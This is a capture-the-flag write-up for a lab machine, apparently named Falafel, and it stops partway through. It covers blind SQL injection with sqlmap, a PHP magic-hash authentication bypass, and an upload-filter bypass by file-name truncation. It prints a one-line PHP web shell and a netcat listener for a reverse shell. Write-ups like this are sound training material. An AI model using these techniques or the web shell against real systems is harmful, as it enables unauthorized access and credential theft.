**Initial Recon**

Nmap

![image](https://user-images.githubusercontent.com/88967140/178944865-a3ef8183-1cd8-4fed-ae77-66f69aceacd8.png)

Web Directory Enumeration (Gobuster)
![image](https://user-images.githubusercontent.com/88967140/178944919-596a497a-5a90-444c-9b73-c7029cb28908.png)
![image](https://user-images.githubusercontent.com/88967140/178944927-a6a217c7-5192-4961-bd8d-f18cba0dd4a2.png)

* cyberlaw.txt looked like an interesting text page, which disclosed a user named `chris`.
* ![image](https://user-images.githubusercontent.com/88967140/178945084-83ed301e-ba19-4c43-ada6-9f99fe908af5.png)

**Initial Foothold**

SQL Injection

Since there wasn't anything else other than the login form, I captured the login POST via Burp and used it in `sqlmap`.
![image](https://user-images.githubusercontent.com/88967140/178946925-b0d2ebe8-d070-4991-92ed-030cef796d44.png)
![image](https://user-images.githubusercontent.com/88967140/178946947-2a01e5a4-efca-491f-b15f-a59adc17788d.png)

Sending different usernames in the login form returned different results - 
![image](https://user-images.githubusercontent.com/88967140/178949194-20b06a3f-c7de-47b4-91ab-7ad42d387bf1.png)
![image](https://user-images.githubusercontent.com/88967140/178949227-3d73042b-ec92-49e0-9b8a-2ce02c366be2.png)
![image](https://user-images.githubusercontent.com/88967140/178949211-e65cf870-43d0-4f3a-a36a-a08d21bc77ab.png)

Notice how entering `admin` as the username would show `Wrong identification` in the response, but using `test` would show `Try again..`.

By this it can be deduced that this login form is vulnerable to a boolean-based blind injection (the username= parameter).

So basically, "Wrong identification" = TRUE, "Try again.." = FALSE.

SQLMap
![image](https://user-images.githubusercontent.com/88967140/178950269-cb0b93b3-6c02-4b91-b68f-905466743b9f.png)

Effectively we can use `Wrong identification` to see if we're on the right track. All we're doing here is dumping credentials from `falafel` database.

![image](https://user-images.githubusercontent.com/88967140/178951074-60df6e3e-7bd2-4218-bab1-63295b690501.png)

PHP Type Juggling

Notice how the password for admin is hashed - it begins with 0e. We can try using magic tables to bypass the authentication and get into the account since 0 to exponent of 462 is still 0. Right here we'll be abusing PHP's Loose comparison weakness.

* Magic Hashes

For this we'll be using MD5 “Magic Number" (from https://www.whitehatsec.com/blog/magic-hashes/) 240610708 as the md5 hash for this string would also start with 0e. As a result this magic hash would collide with other hashes as both are treated as 0 and therefore would compare to be **true**

I successfully logged in by using `240610708` as the password for `admin`

![image](https://user-images.githubusercontent.com/88967140/178952959-d8c94975-1d82-4e92-9496-8e8686a450d5.png)
![image](https://user-images.githubusercontent.com/88967140/178952977-b66d8f8c-c6f0-405b-a8bd-51cdfb9ff58d.png)

At the start I tried to upload a .php file to see if we can get an easy php reverse shell.
![image](https://user-images.githubusercontent.com/88967140/178953133-25763a14-7af2-4356-96e9-3f48070d1dde.png)
From this image we can clearly see .php files won't work

**File Name Truncation**
What I did was create a file with 251 characters using `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 251`, add .png at the end of the file and upload it. 

![image](https://user-images.githubusercontent.com/88967140/178954298-a5a63f19-d81b-425c-8482-bba311b7e6a6.png)

Interestingly enough the output mentioned the file name being too long and shortening it, which turned out to be from 255 characters to 236
![image](https://user-images.githubusercontent.com/88967140/178954663-adad24d9-8614-4fe3-96a5-111256cfe655.png)

So now my idea was to make it so that the .png part gets cut off by the upload system and we're left off with <file>.php from which we can execute PHP code.
I used `vi` to insert this arbitrary PHP execution code in the file we're going to upload next:
 `<?php echo system($_REQUEST['leo']) ?>`
and set up `nc -lvnp 12345` on our other terminal

